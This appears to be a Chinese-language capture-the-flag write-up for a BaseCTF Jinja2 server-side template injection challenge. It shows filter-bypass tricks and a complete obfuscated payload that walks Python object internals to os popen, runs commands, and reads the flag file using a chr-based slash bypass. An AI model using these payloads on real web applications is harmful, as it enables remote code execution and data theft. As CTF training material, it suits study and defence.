{{}}使用{%print%}绕过

__屏蔽选择  _''_绕过

.使用[]绕过
{{().__class__}} 可替换为:{{()["__class__"]}}

```

然后将经典句式替换(当然，具体位置和命令都可以修改)

```
{%print(c.__class__.__mro__[3].__subclasses__()[137].__init__.__globals__['popen']('whoami').read())%}进行替换
```

但是这里不知到为什么

```
__mro__失效了，于是运用基础的__base__
```

用一次base找到了obj，然后从obj用__subclasses__()进入经典变量popen所在地<class 'os._wrap_close'>

![](https://s2.loli.net/2024/11/17/HaWXK5RjcteZf7w.png)

之后按照经典套路进入popen执行命令即可

用init初始化，用global进入全局变量，选择popen，执行pwn命令并加上read读出指令让print打印出来

```
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('pwd')['rea''d']())%}
```

然后考虑到/被ban，使用chr绕过即可

```
BaseCTF{% set cmd='cat '~'%c'%(47)~'flag' %} {%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen'](cmd)['rea''d']())%}
```

而为了修改方便，popen中的命令使用cmd变量即可

![](https://s2.loli.net/2024/11/17/vaTI4uZXSn6RDwh.png)